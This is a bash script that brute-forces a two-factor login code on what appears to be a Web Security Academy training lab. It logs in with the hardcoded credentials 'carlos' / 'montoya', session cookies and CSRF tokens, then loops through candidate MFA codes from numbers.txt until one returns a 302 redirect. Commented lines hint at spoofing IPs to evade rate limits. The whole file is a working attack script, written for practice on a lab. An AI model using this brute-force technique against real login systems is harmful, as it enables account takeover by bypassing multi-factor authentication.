#!/bin/bash

#fake_ip=19999

#current_user="carlos"

while read MFA; do

    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "csrf=VYrK49Tka121sGGCKtW7QwA8gPLDHz1B&mfa-code=0011" -H "Cookie: session=Bf6gY61abe8Nl3Vx8sIrzu6yUw4QAp6t" -X GET "https://0a5800e703e1a4cbc054374700510088.web-security-academy.net/login")

    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "csrf=LStBYPrJzunzplMsyZYVBTwh4sqFrSYj&username=carlos&password=montoya" -H "Cookie: session=2raJNNk0p886XlFsiHqYND1ZFq410m5w" -X POST "https://0a5800e703e1a4cbc054374700510088.web-security-academy.net/login")

    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "csrf=VYrK49Tka121sGGCKtW7QwA8gPLDHz1B" -H "Cookie: session=Bf6gY61abe8Nl3Vx8sIrzu6yUw4QAp6t" -X GET "https://0a5800e703e1a4cbc054374700510088.web-security-academy.net/login2")

    code=$(curl -w "%{http_code}\n" -o /dev/null -s -k -d "csrf=VYrK49Tka121sGGCKtW7QwA8gPLDHz1B&mfa-code=$MFA" -H "Cookie: session=Bf6gY61abe8Nl3Vx8sIrzu6yUw4QAp6t" -X POST "https://0a5800e703e1a4cbc054374700510088.web-security-academy.net/login2")

    if [ $code -eq "302" ];then
    echo $code $MFA
    else
        echo -n "."
    fi

    #let fake_ip++
    
done < ./numbers.txt
